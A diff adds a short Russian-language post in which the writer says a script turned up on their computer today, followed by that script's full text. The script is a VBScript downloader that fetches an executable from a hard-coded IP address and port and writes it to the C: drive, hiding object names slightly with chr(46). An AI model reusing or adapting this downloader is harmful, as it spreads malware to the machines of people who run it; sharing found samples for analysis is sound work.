@@ -1,0 +1,25 @@
+попал мне сегодня на комп скрипт вот такого содержания
+
+dim HTTPGET
+dim Data
+dim ExeURL
+dim LocalPath
+
+ExeURL = "http://85.28.104.76:10229/84785_mssql.exe"
+LocalPath = "c:\Rtsecar.exe"
+
+Set HTTPGET = CreateObject("Microsoft" & chr(46) & "XMLHTTP")
+Set Data = CreateObject("ADODB" & chr(46) & "Stream")
+
+HTTPGET.Open "GET", ExeURL, false
+HTTPGET.Send
+
+Const adTypeBinary = 1
+Const adSaveCreateOverWrite = 2
+
+Data.Type = adTypeBinary
+Data.Open
+Data.Write HTTPGET.ResponseBody
+Data.SaveToFile LocalPath, adSaveCreateOverWrite
+
+
